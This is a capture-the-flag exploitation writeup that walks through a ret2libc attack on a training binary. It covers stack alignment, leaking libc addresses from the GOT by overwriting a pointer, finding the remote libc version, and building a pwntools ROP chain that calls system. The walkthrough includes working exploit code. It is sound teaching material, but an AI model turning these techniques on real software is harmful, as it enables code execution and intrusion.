# Writeup

## Forward

You may have noticed the use of:

```c
__attribute__((force_align_arg_pointer))
```

In a few of the previous challenges. I have not mentioned it until now as it would only confuse matters. For this challenge, however, it is important.

Certain `x86` instructions require that the memory addresses they operate on are 16-byte aligned. One such instruction is `movaps` which will cause a segmentation fault if one of the operands is misaligned. This instruction is often present in `system` and operates on `rsp` which means that issues can arise if `rsp` is not 16-byte aligned after the function is called. Generally this is not an issue as the compiler ensures this alignment but when doing ROP it is something we must be wary of.

The `force_align_arg_pointer` attribute was used in previous challenges to mitigate this issue by adding a prologue to the `win` functions which realigned `rsp`.

[This](https://www.cameronwickes.com/stack-alignment-ubuntu-18-04-movaps/) blog article goes into more detail if you are interested.

## Static Analysis

This time there is no `win` function. We have `target` again and the `vuln` function has been modified:

```c
void vuln(void) {
    char *hint = target;
    char buffer[16];

    printf("Enter your name: ");
    fgets(buffer, 1024, stdin);
    printf("Hello, %s", buffer);

    printf("You might want to find a way of running \"%s\".\n", hint);

    return;
}
```

A new local variable, `hint`, has been added which is used to display a message using `printf`.

There are no calls to `system` in the program so there is no obvious place to return to. There are, however, other standard library functions that are used such as `fgets` and `printf` which means that `libc` and thus the `system` function itself must be somewhere in memory and in such a large codebase there must be the ROP gadgets required to set the argument registers from the stack.

There are a couple of issues with this plan, one of which is ASLR (Address Space Layout Randomisation). This security feature means that the memory address of `libc` changes every time the program is run. This can be defeated by leaking an address and using the overflow to overwrite `hint` gives us a method to do just this.

The second issue is that `libc` varies between operating systems meaning something that works on my local machine may not work remotely. In this case we are given a `Dockerfile` so that we can replicate the remote environment but we will treat it as if we were going in blind and use a different method for determining the remote version.

## Dynamic Analysis

Let's start by running the program in GDB with our standard input string:

```
gdb ./vuln
r
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
```

This time the program faults in `printf` because of the invalid address `0x6665646362615a59` (`YZabcdef`) which is an offset of 24. Using `f 5` and `p hint` we see that we overwrote `hint` and therefore caused `printf` to try and output data from an invalid memory location. Looking at the back trace panel of the context display we can see `0x767574737271706f` (`opqrstuv`) which means the offset to the return address is 40.

Let us consider what happens when a standard library function such as `printf` is called. If we do `disass vuln` we see that `printf@plt` is called. If we enter `plt` we can see that there are also PLT (Procedure Linkage Table) entries for the other `libc` functions that we call:

```
0x401030: printf@plt
0x401040: fgets@plt
0x401050: setvbuf@plt
```

Now let's do `disass 0x401030` to see the assembly for this function:

```assembly
0x0000000000401030 <+0>:     jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <printf@got.plt>
```

All it does is jump to the address stored at `printf@got.plt`. Typing `got` shows us that the other standard library functions also have GOT (Global Offset Table) entries and that `printf@got.plt` just stores the address of `printf`:

```
[0x404018] printf@GLIBC_2.2.5 -> 0x7ffff7e44cf0 (printf) ◂— sub    rsp, 0xd8
[0x404020] fgets@GLIBC_2.2.5 -> 0x7ffff7e629c0 (fgets) ◂— test   esi, esi
[0x404028] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e64cd0 (setvbuf) ◂— push   r14
```

So why is this roundabout method used of calling `printf` used? Why don't we just call it directly?

The short answer is we can't. Because of ASLR and having to run on different systems it is impossible to know where the `libc` functions are at compile time. Calls are instead made to a wrapper function in the PLT. When the program is executed, the GOT is populated with the requisite addresses which are jumped to by the wrapper functions.

We can use the GOT in combination with our `hint` overwrite to leak a `libc` address and defeat ASLR (thus solving our first problem). If we can leak multiple addresses it is possible to solve our second problem matching the offsets between them to a database of `libc` versions.

## Exploit

This exploit will be quite complex so we will definitely want to use Pwntools:

```
pwn template vuln --host 127.0.0.1 --port 42006 --quiet > exploit.py
```

First we need to engineer our leak. As we want to leak multiple addresses we can set the return address to `vuln` which allows us to exploit the buffer overflow multiple times. Unfortunately this will cause the stack to become misaligned so we will have to use a `ret` gadget such as the one at `vuln+110` to realign it.

After the leaked data has been outputted we will need to convert it from a series of bytes to an integer. `printf` will stop outputting when it hits a null byte so we will have to use `.ljust` to add any that have been removed. After this we can use `u64` to unpack the bytes into an integer.

All of this can be put in a function so that we can reuse it as much as we need:

```python
ret = exe.sym.vuln + 110

def leak(address):
    # ret needed to keep stack aligned
    io.sendlineafter("Enter your name: ", flat({
        24: address,
        40: [ret, exe.sym.vuln]
    }))

    io.recvuntil("running \"")
    return u64(io.recvuntil("\".", drop=True).ljust(8, b"\0"))
```

GOT addresses can be accessed using `exe.got`. Adding:

```python
print(f"printf: 0x{leak(exe.got.printf):016x}")
print(f"fgets: 0x{leak(exe.got.fgets):016x}")
print(f"setvbuf: 0x{leak(exe.got.setvbuf):016x}")
```

And running the exploit remotely will leak the three `libc` addresses. We can use https://libc.blukat.me/ to search the a `libc` database for these offsets. Doing so will show three results. Whilst any will probably work I will use the `libc6_2.31-0ubuntu9.2_amd64` one and download the binary. The local `libc` binary can be found at `/lib/x86_64-linux-gnu/libc.so.6`.

At this point we will have to vary our exploit depending on if we are running locally or remotely as the `libc` builds will differ. We can do this by testing `args.LOCAL`.

Pwntools provides a class called `ELF` to represent an ELF binary. The `exe` that we have used already is an instance of this class. We can create an instances for our `libc` binaries in order to provide a convenient interface:

```python
if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("libc6_2.31-0ubuntu9.2_amd64.so")
```

Now we can calculate the base address if `libc` using our leak in order to defeat ASLR:

```python
libc.address = leak(exe.got.printf) - libc.sym.printf
```

Following this we will use a very powerful class provided by Pwntools, `ROP`. It takes an `ELF` instance as an argument:

```python
rop = ROP(libc)
```

We can use `rop.call` followed by `rop.build` to create a ROP chain that calls `system` with `target` as the argument. We still need to remember to use the `ret` gadget to align the stack:

```python
rop.call("system", (exe.sym.target,))

io.sendlineafter("Enter your name: ", flat({
    24: exe.sym.target,
    40: [ret, rop.build()]
}))
```

And that's it! The full exploit can be found in `exploit.py`.